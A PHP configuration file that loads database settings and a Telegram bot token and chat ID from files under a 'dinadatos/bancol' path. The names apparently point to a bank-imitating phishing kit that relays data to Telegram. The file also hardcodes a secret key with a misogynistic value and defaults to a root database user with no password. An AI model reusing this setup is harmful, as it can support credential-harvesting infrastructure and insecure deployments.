<?php
// Configuración global del proyecto
$db_host = 'localhost';
$db_user = 'root';
$db_pass = '';
$db_name = 'aire';
$db_port = '3306';
$db_driver = 'mysql'; // Por defecto MySQL en desarrollo local

if (getenv('DATABASE_URL')) {
    $url = parse_url(getenv('DATABASE_URL'));
    $db_host = $url['host'] ?? null;
    $db_user = $url['user'] ?? null;
    $db_pass = $url['pass'] ?? null;
    $db_name = ltrim($url['path'] ?? '', '/');
    $db_port = $url['port'] ?? 5432;
    $db_driver = 'pgsql'; // Render utiliza PostgreSQL en producción
} else {
    // Intentar leer de conexion.php local
    $conexionPath = __DIR__ . '/../dinadatos/bancol/assets/config/conexion.php';
    if (!file_exists($conexionPath)) {
        $conexionPath = __DIR__ . '/dinadatos/bancol/assets/config/conexion.php';
    }
    if (!file_exists($conexionPath)) {
        $conexionPath = __DIR__ . '/../api/php_sources/dinadatos/bancol/assets/config/conexion.php';
    }
    if (!file_exists($conexionPath)) {
        $conexionPath = __DIR__ . '/../../dinadatos/bancol/assets/config/conexion.php';
    }
    if (!file_exists($conexionPath)) {
        $conexionPath = __DIR__ . '/../../../dinadatos/bancol/assets/config/conexion.php';
    }
    if (!file_exists($conexionPath)) {
        $conexionPath = __DIR__ . '/../../../../dinadatos/bancol/assets/config/conexion.php';
    }
    
    if (file_exists($conexionPath)) {
        $conexion = require $conexionPath;
        if (isset($conexion['db'])) {
            $db_host = $conexion['db']['host'] ?? $db_host;
            $db_user = $conexion['db']['user'] ?? $db_user;
            $db_pass = $conexion['db']['pass'] ?? $db_pass;
            $db_name = $conexion['db']['dbname'] ?? $db_name;
            $db_port = $conexion['db']['port'] ?? $db_port;
            $db_driver = $conexion['db']['driver'] ?? $db_driver;
        }
    }
}

// Obtener credenciales de Telegram dinámicamente desde botmaster2.php
$botmasterPath = __DIR__ . '/dinadatos/botmaster2.php';
if (!file_exists($botmasterPath)) {
    $botmasterPath = __DIR__ . '/../dinadatos/botmaster2.php';
}
if (!file_exists($botmasterPath)) {
    $botmasterPath = __DIR__ . '/../api/php_sources/dinadatos/botmaster2.php';
}
if (!file_exists($botmasterPath)) {
    $botmasterPath = __DIR__ . '/../../dinadatos/botmaster2.php';
}
if (!file_exists($botmasterPath)) {
    $botmasterPath = __DIR__ . '/../../../dinadatos/botmaster2.php';
}
if (!file_exists($botmasterPath)) {
    $botmasterPath = __DIR__ . '/../../../../dinadatos/botmaster2.php';
}

$botToken = '';
$chatId = '';
if (file_exists($botmasterPath)) {
    $content = file_get_contents($botmasterPath);
    if (preg_match('/\{.*\}/', $content, $matches)) {
        $data = json_decode($matches[0], true);
        $botToken = $data['token'] ?? '';
        $chatId = $data['chat_id'] ?? '';
    }
}

return [
    'botToken' => $botToken,
    'chatId' => $chatId,
    'security_key' => 'lasmujeressonmalas', // Llave de seguridad
    'db_host' => $db_host,
    'db_user' => $db_user,
    'db_pass' => $db_pass,
    'db_name' => $db_name,
    'db_port' => $db_port,
    'db_driver' => $db_driver,
    'baseUrl' => getenv('RENDER_EXTERNAL_URL') ? getenv('RENDER_EXTERNAL_URL') : 'http://localhost/tique',
];
?>
